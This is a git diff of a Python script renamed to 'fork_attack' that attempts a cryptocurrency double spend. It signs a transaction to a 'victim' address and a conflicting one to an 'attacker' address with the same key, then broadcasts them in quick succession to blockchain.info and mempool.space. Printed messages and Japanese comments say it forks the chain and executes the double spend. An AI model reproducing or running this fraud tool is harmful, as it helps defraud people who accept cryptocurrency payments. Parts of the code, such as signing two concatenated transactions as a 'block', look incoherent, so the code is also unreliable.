@@ -12,7 +12,7 @@ from litecoinutils.keys import PrivateKey
 from bitcoincli import Bitcoin
 from bs4 import BeautifulSoup
 
-parser = argparse.ArgumentParser(description="How To use vector76_ltc")
+parser = argparse.ArgumentParser(description="How To use fork_attack")
 
 parser.add_argument("from_wifkey",
                     help="Fake send btc from wif key.",
@@ -39,27 +39,6 @@ parser.add_argument("is_testnet",
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
-def generate_block(address, block, submit=False):
-    return subprocess.run(f'litecoin-cli generateblock "{address}" \'["{block}"]\' {str(submit).lower()} false',
-                             shell=True,
-                             capture_output=True,
-                             text=True,
-                             check=True)
-
-def send_rawtransaction(hextx):
-    result = subprocess.run(f'litecoin-cli sendrawtransaction {hextx}',
-                             shell=True,
-                             capture_output=True,
-                             text=True,
-                             check=True)
-    return result.stdout
-
-def submit_block(block):
-    subprocess.run(f'litecoin-cli submitblock {block}',
-                             shell=True,
-                             capture_output=True,
-                             text=True,
-                             check=True)
 
 def broadcast_transaction(raw_tx, testnet):
     url = "https://blockchain.info/pushtx"
@@ -97,30 +76,18 @@ victim_address   = args.send_to
 attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
+coin_symbol = args.symbol
 
 if testnet == 0:
     testnet = False
 else:
     testnet = True
-coin_symbol = args.symbol
+
 fee = to_satoshi(args.fee)
-
-if testnet:
-    print("testnet mode")
-port     = 8332
-if testnet:
-    port     = 18332 # testnet ltc port
-
-if "ltc" == coin_symbol:
-    port = 9332
-    if testnet:
-        port = 19332
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 if coin_symbol == "ltc":
     transaction_util = cryptos.Litecoin(testnet=testnet)
-    #node = litecoin.rpc.Proxy(f"http://fallacy.fiatfaucet.com:{port}", service_port=port)
-    #print(node.getinfo())
     sender  = transaction_util.privtopub(fake_send_from)
     address = transaction_util.pubtoaddr(sender)
     balance = transaction_util.get_balance(address)
@@ -131,11 +98,6 @@ else:
 
 print("OK")
 print(balance)
-#if balance["confirmed"] <= 0:
-#    balance = balance["unconfirmed"]
-#else:
-#    balance = balance["confirmed"]
-
 
 send_amount = to_satoshi(amount_btc)
 
@@ -152,19 +114,16 @@ tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 
 tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
 tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
-#tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
 block = f"{tx_attacker}{tx_victim}"
 
 block = transaction_util.signall(block, fake_send_from)
 block = cryptos.serialize(block)
-#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
-#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
 print()
-print("[+] READY...")
 print()
+print("[+] READY...")
 print()
 print("--------------------")
 print(f"Send to                           : {victim_address}")
@@ -177,33 +136,21 @@ print(f"Testnet Mode                      : {testnet}")
 print("--------------------")
 print()
 print()
-#print(f"Generating Vector76 Block")
-#send_rawtransaction(tx_attacker)
-#generated_vector76_block = generate_block(attacker_address, tx_attacker)["hex"]
 print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print("Sending victim Transaction ...")
 
-broadcast_transaction(tx_victim, testnet)
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(1) #詠唱中.... -u-
-print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-time.sleep(1) #ラグ作り 0u0
+time.sleep(1) #詠唱中.... -o-
+print("FRK BC EXE DSPND (ブロックチェーンを分岐、 二重払いを実行!)")
+time.sleep(1) 
+broadcast_transaction(tx_victim, testnet)
+time.sleep(0.7) # >>>> FRK BC EXE DSPND 0w0
 print()
-#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)#broadcast_transaction(tx_attacker, testnet)
-broadcast_mempool_space(block, testnet)
-#broadcast_mempool_space(tx_attacker, testnet)
-#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
+broadcast_mempool_space(block, testnet) #異なるサービスに素早く送ることが重要。
 print()
-#print()
-#node.call("submitblock", data)
-#time.sleep(0.7)
-#print("Submit Block ...")
-#submit_block(data)
 print()
-#txid2 = transaction_util.pushtx(tx_attacker)
-print("OK")
 
 print()
 #おまけ
